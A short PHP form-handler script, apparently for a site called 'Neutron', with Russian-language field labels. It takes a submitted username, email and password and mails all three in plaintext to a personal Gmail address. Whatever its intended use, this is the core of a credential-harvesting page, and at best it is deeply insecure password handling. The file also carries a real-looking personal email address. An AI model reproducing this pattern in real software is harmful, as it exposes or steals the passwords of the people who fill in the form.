<?php

$recepient = "anthem.jaff@gmail.com";
$sitename = "Neutron";
$username = trim($_POST["username"]);
$email = trim($_POST["email"]);
$password = trim($_POST["password"]);
$message = "Имя: $username \nПочта: $email \nПароль: $password";

$pagetitle = "Поступила заявка с сайта \"$sitename\"";
mail($recepient, $pagetitle, $message, "Content-type: text/plain; charset=\"utf-8\"\n From: $recepient");

?>